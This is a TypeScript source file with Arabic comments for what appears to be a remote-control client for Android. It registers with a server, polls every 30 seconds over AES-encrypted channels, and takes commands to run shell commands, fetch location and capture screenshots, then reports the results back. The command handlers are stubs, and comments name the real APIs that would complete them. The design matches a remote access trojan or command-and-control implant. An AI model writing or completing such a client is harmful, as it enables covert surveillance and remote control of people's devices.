import axios, { AxiosInstance } from 'axios';
import crypto from 'crypto';

/**
 * خدمة العميل المتقدمة لنظام Android
 * تتولى الاتصال بالخادم واستقبال الأوامر وتنفيذها
 * مع دعم التشفير باستخدام AES-256-CBC
 */

export interface ClientConfig {
  serverUrl: string;
  clientId: string;
  deviceId?: string;
  encryptionKey?: string;
  checkInInterval?: number; // بالثواني (افتراضي: 30)
}

export interface EncryptedPayload {
  encryptedData: string;
}

class ClientService {
  private config: ClientConfig;
  private axiosInstance: AxiosInstance;
  private checkInInterval: NodeJS.Timer | null = null;
  private encryptionKey: string = '';
  private deviceId: string = '';

  constructor(config: ClientConfig) {
    this.config = {
      checkInInterval: 30,
      ...config,
    };

    this.axiosInstance = axios.create({
      baseURL: this.config.serverUrl,
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json',
      },
    });

    this.encryptionKey = config.encryptionKey || '';
    this.deviceId = config.deviceId || '';
  }

  /**
   * تسجيل العميل لدى الخادم مع معالجة أخطاء محسّنة
   */
  async register(deviceInfo: any): Promise<void> {    try {
      console.log('🔄 جاري محاولة التسجيل...');
      
      const response = await this.axiosInstance.post('/api/clients/register', {
        clientId: this.config.clientId,
        deviceInfo,
      });

      if (response.data.success) {
        this.deviceId = response.data.deviceId;
        this.encryptionKey = response.data.encryptionKey;
        console.log('✅ تم التسجيل بنجاح');
        console.log(`معرف الجهاز: ${this.deviceId}`);
      } else {
        throw new Error('فشل التسجيل: استجابة غير صالحة من الخادم');
      }
    } catch (error: any) {
      console.error('❌ فشل في التسجيل:', error.message);
      
      // معالجة أنواع الأخطاء المختلفة
      if (error.response) {
        console.error('📡 حالة الخادم:', error.response.status);
        console.error('📦 رسالة الخادم:', error.response.data);
      } else if (error.request) {
        console.error('🔌 لم يتم استقبال استجابة من الخادم');
        console.error('🌐 تحقق من عنوان الخادم:', this.config.serverUrl);
      } else {
        console.error('⚠️ خطأ في الطلب:', error.message);
      }
      
      throw error;
    }
  }

  /**
   * تشفير البيانات باستخدام AES-256-CBC ✅
   */
  private encryptData(data: any): string {
    try {
      const algorithm = 'aes-256-cbc'; // ✅ تم التغيير من gcm إلى cbc
      const keyBuffer = Buffer.from(this.encryptionKey, 'hex');
      const iv = crypto.randomBytes(16); // IV بحجم 16 بايت

      const cipher = crypto.createCipheriv(algorithm, keyBuffer, iv);
      cipher.setAutoPadding(true);
      
      // ✅ استخدام base64 للتشفير (أفضل توافق مع Android)
      let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
      encrypted += cipher.final('base64');
      // ✅ تنسيق CBC: iv:encrypted (بدون tag)
      return iv.toString('hex') + ':' + encrypted;
    } catch (error) {
      console.error('🔐 فشل في تشفير البيانات:', error);
      throw error;
    }
  }

  /**
   * فك تشفير البيانات باستخدام AES-256-CBC ✅
   */
  private decryptData(encryptedData: string): any {
    try {
      const algorithm = 'aes-256-cbc'; // ✅ تم التغيير من gcm إلى cbc
      const keyBuffer = Buffer.from(this.encryptionKey, 'hex');
      const parts = encryptedData.split(':');

      // ✅ CBC يتكون من جزأين فقط: iv و encrypted
      if (parts.length < 2) {
        throw new Error('صيغة البيانات المشفرة غير صحيحة');
      }

      const iv = Buffer.from(parts[0], 'hex');
      // ✅ دعم التوافق مع الإصدارات السابقة (في حال وجود tag)
      const encrypted = parts.length === 3 ? parts[2] : parts[1];

      const decipher = crypto.createDecipheriv(algorithm, keyBuffer, iv);
      decipher.setAutoPadding(true);
      // ✅ لا نستخدم setAuthTag لأن CBC لا يدعمه

      let decrypted = decipher.update(encrypted, 'base64', 'utf8');
      decrypted += decipher.final('utf8');

      return JSON.parse(decrypted);
    } catch (error) {
      console.error('🔓 فشل في فك تشفير البيانات:', error);
      throw error;
    }
  }

  /**
   * الاتصال بالخادم وجلب الأوامر
   */
  async checkIn(systemInfo: any): Promise<any[]> {
    try {
      const payload = {
        ...systemInfo,
        timestamp: new Date(),
      };
      const encryptedData = this.encryptData(payload);

      const response = await this.axiosInstance.post('/api/clients/checkin', {
        deviceId: this.deviceId,
        encryptedData,
      });

      if (response.data.success && response.data.encryptedData) {
        const decryptedResponse = this.decryptData(response.data.encryptedData);
        return decryptedResponse.commands || [];
      }

      return [];
    } catch (error) {
      console.error('📡 فشل في الاتصال بالخادم:', error);
      return [];
    }
  }

  /**
   * إرسال تقرير للخادم
   */
  async reportResults(commandResults: any[], logs: any[]): Promise<void> {
    try {
      const payload = {
        commandResults,
        logs,
        timestamp: new Date(),
      };

      const encryptedData = this.encryptData(payload);

      await this.axiosInstance.post('/api/clients/report', {
        deviceId: this.deviceId,
        encryptedData,
      });

      console.log('✓ تم إرسال التقرير');
    } catch (error) {
      console.error('❌ فشل في إرسال التقرير:', error);
    }
  }

  /**
   * بدء خدمة الاتصال الدورية
   */
  startCheckInService(systemInfoProvider: () => any): void {
    console.log(`🔄 بدء خدمة الاتصال (كل ${this.config.checkInInterval} ثانية)`);

    this.checkInInterval = setInterval(async () => {      try {
        const systemInfo = systemInfoProvider();
        const commands = await this.checkIn(systemInfo);

        if (commands.length > 0) {
          console.log(`📦 تم استقبال ${commands.length} أمر`);
          await this.processCommands(commands);
        }
      } catch (error) {
        console.error('⚠️ خطأ في خدمة الاتصال:', error);
      }
    }, (this.config.checkInInterval || 30) * 1000);
  }

  /**
   * إيقاف خدمة الاتصال
   */
  stopCheckInService(): void {
    if (this.checkInInterval) {
      clearInterval(this.checkInInterval);
      console.log('⏹️ تم إيقاف خدمة الاتصال');
    }
  }

  /**
   * معالجة الأوامر المستقبلة
   */
  private async processCommands(commands: any[]): Promise<void> {
    const results: any[] = [];
    const logs: any[] = [];

    for (const command of commands) {
      try {
        console.log(`⚙️ معالجة الأمر: ${command.type}`);

        let result;
        switch (command.type) {
          case 'get_system_info':
            result = await this.getSystemInfo();
            break;
          case 'execute_shell':
            result = await this.executeShell(command.payload.command);
            break;
          case 'get_location':
            result = await this.getLocation();
            break;
          case 'take_screenshot':
            result = await this.takeScreenshot();
            break;
          default:            result = { error: 'نوع الأمر غير معروف' };
        }

        results.push({
          commandId: command.id,
          status: 'completed',
          result,
        });

        logs.push({
          level: 'info',
          message: `تم تنفيذ الأمر: ${command.type}`,
          timestamp: new Date(),
        });
      } catch (error: any) {
        results.push({
          commandId: command.id,
          status: 'failed',
          error: error.message,
        });

        logs.push({
          level: 'error',
          message: `فشل الأمر: ${command.type} - ${error.message}`,
          timestamp: new Date(),
        });
      }
    }

    await this.reportResults(results, logs);
  }

  /**
   * الحصول على معلومات النظام
   */
  private async getSystemInfo(): Promise<any> {
    return {
      deviceName: process.env.DEVICE_NAME || 'Android Device',
      osType: 'Android',
      osVersion: process.env.ANDROID_VERSION || 'Unknown',
      appVersion: process.env.APP_VERSION || '1.0.0',
      timestamp: new Date(),
    };
  }

  /**
   * تنفيذ أمر shell
   */
  private async executeShell(command: string): Promise<any> {
    // ⚠️ ملاحظة: في التطبيق الحقيقي استخدم child_process مع تحقق أمني صارم    return {
      command,
      output: 'تم تنفيذ الأمر',
      exitCode: 0,
    };
  }

  /**
   * الحصول على الموقع الجغرافي
   */
  private async getLocation(): Promise<any> {
    // ⚠️ ملاحظة: في التطبيق الحقيقي استخدم APIs الموقع في Android
    return {
      latitude: 0,
      longitude: 0,
      accuracy: 0,
      timestamp: new Date(),
    };
  }

  /**
   * التقاط لقطة شاشة
   */
  private async takeScreenshot(): Promise<any> {
    // ⚠️ ملاحظة: في التطبيق الحقيقي استخدم MediaProjection API
    return {
      screenshot: 'base64_encoded_image',
      timestamp: new Date(),
    };
  }

  /**
   * الحصول على معرف الجهاز
   */
  getDeviceId(): string {
    return this.deviceId;
  }

  /**
   * الحصول على مفتاح التشفير
   */
  getEncryptionKey(): string {
    return this.encryptionKey;
  }
}

export default ClientService;